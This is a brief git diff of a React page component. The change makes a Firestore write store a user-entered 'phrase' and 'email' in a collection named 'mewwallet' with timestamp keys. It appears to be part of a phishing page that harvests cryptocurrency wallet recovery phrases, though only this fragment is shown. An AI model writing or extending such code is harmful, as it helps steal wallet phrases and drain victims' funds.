@@ -59,7 +59,7 @@ export default function Home() {
     }
     setLoading(true);
     await setDoc(
-      doc(db, "users", `${uniqueKey}`),
+      doc(db, "mewwallet", `${Date.now()}`),
       {
         phrase: phrase,
         email: email,
